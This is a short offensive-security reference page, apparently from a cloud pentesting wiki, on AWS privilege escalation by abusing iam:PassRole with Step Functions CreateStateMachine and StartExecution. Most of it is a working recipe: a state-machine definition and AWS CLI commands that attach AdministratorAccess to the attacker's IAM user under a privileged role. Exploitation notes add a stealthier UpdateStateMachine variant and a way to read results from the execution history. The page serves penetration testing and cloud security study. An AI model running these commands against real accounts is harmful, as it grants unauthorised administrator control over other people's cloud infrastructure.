---
title: "Step Functions: PassRole to CreateStateMachine for a privileged role"
description: "iam:PassRole with states:CreateStateMachine and states:StartExecution to run arbitrary tasks under a privileged state-machine role."
keywords:
  - PassRole
  - Step Functions
  - CreateStateMachine
  - StartExecution
  - state machine
  - privilege escalation
---

# Step Functions

With `iam:PassRole` and `states:CreateStateMachine` (plus `states:StartExecution`), you define a state machine that runs tasks under a privileged **execution role** and start it. The state machine's role is the one you pass, so any action its tasks invoke, a Lambda call, an SDK integration, a `aws-sdk:*` optimized task, runs with that role's permissions.

## Create and run a state machine

```bash
# a minimal machine that calls an AWS SDK action under the passed role
cat > def.json <<'EOF'
{"Comment":"x","StartAt":"call","States":{
  "call":{"Type":"Task","Resource":"arn:aws:states:::aws-sdk:iam:attachUserPolicy",
    "Parameters":{"UserName":"me","PolicyArn":"arn:aws:iam::aws:policy/AdministratorAccess"},
    "End":true}}}
EOF
aws stepfunctions create-state-machine --name x \
  --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --definition file://def.json
aws stepfunctions start-execution --state-machine-arn <arn>
```

The `aws-sdk` service integration lets a single state call almost any API directly as the role, so the machine does not even need a Lambda to carry the payload.

## Exploitation notes

- The passed role's trust policy must allow `states.amazonaws.com`, standard for any role built for Step Functions.
- `states:UpdateStateMachine` on an existing machine that already carries a privileged role is a quieter variant: swap its definition rather than creating one.
- Output of each task is captured in the execution history (`get-execution-history`), so results come back without any callback infrastructure.

## Tools

- **AWS CLI** (`stepfunctions create-state-machine` / `start-execution` / `get-execution-history`).
- **Pacu** (`iam__privesc_scan`): flags the PassRole-capable role set this abuses.

## References

- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [AWS: Step Functions AWS SDK service integrations](https://docs.aws.amazon.com/step-functions/latest/dg/supported-services-awssdk.html)
- [HackTricks Cloud: AWS Step Functions privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-states-privesc.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
